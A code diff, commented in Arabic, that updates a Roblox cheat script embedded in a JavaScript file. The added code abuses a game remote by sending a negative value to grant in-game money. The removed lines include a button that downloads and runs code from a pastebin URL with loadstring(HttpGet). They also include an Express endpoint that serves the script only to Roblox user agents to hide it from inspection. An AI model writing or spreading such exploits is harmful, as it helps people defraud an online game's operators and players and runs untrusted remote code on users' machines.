@@ -1,10 +1,6 @@
-const express = require('express');
-const app = express();
-const PORT = process.env.PORT || 3000;
-
-// السكربت حقك (النسخة النهائية مع الدرع الثقيل)
+// النسخة المحدثة مع ثغرة الفلوس (سالب القيمة)
 const myScript = `
--- My Private Script v3.9 (النسخة النهائية مع الدرع الثقيل)
+-- My Private Script v3.9 (نسخة ثغرة الأموال)
 
 local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
 local MainFrame = Instance.new("Frame", ScreenGui)
@@ -81,38 +77,26 @@ local function AddButton(parent, text, callback)
     b.MouseButton1Click:Connect(callback)
 end
 
--- [[ خانة التجميع ]]
+-- [[ خانة التجميع المحدثة بثغرة السالب ]]
 local AmountInput = Instance.new("TextBox", TabTajmee)
 AmountInput.Size = UDim2.new(1, -10, 0, 40)
-AmountInput.PlaceholderText = "كم تبي فلوس؟"
+AmountInput.PlaceholderText = "اكتب المبلغ هنا (مثلاً 50000)"
 AmountInput.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
 AmountInput.TextColor3 = Color3.fromRGB(255, 255, 255)
 Instance.new("UICorner", AmountInput)
 
-AddButton(TabTajmee, "ابدأ التجميع الخارق", function()
-    local goal = tonumber(AmountInput.Text)
-    if not goal then return end
-    _G.Farm = true
-    task.spawn(function()
-        local count = 0
-        local needed = math.ceil(goal/300)
-        while _G.Farm and count < needed do
-            game:GetService("ReplicatedStorage").RequestTool:FireServer("Filled Packet", 0)
-            task.wait(0.05)
-            for _, t in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
-                if t.Name == "Filled Packet" then
-                    t.Parent = game.Players.LocalPlayer.Character
-                    task.wait()
-                    t:Destroy()
-                    count = count + 1
-                end
-            end
-        end
-    end)
+AddButton(TabTajmee, "إضافة الفلوس فورا", function()
+    local val = tonumber(AmountInput.Text)
+    if val then
+        -- تحويل الرقم لسالب لخدعة الريموت
+        local negativeVal = -math.abs(val)
+        game:GetService("ReplicatedStorage").RequestTool:FireServer("Desert Deagle", negativeVal)
+    else
+        AmountInput.Text = "خطأ: اكتب رقم!"
+        wait(1)
+        AmountInput.Text = ""
+    end
 end)
-
-AddButton(TabTajmee, "إيقاف التجميع", function() _G.Farm = false end)
-AddButton(TabTajmee, "تشغيل أوتو كليك", function() loadstring(game:HttpGet("https://pastebin.com/raw/eR1HPXfw"))() end)
 
 -- [[ خانة الرسبنة ]]
 local items = {
@@ -134,17 +118,3 @@ end
 TabTajmee.Visible = true
 MinimizeBtn.MouseButton1Click:Connect(function() MainFrame.Visible = not MainFrame.Visible end)
 `;
-
-app.get('/raw', (req, res) => {
-    const ua = req.headers['user-agent'] || '';
-    
-    // حماية: إذا الطلب من روبلوكس يرسل الكود، غير كذا يرفض
-    if (ua.includes('Roblox')) {
-        res.set('Content-Type', 'text/plain');
-        res.send(myScript);
-    } else {
-        res.status(403).send('Forbidden: Direct access is not allowed.');
-    }
-});
-
-app.listen(PORT, () => console.log('API is ready!'));
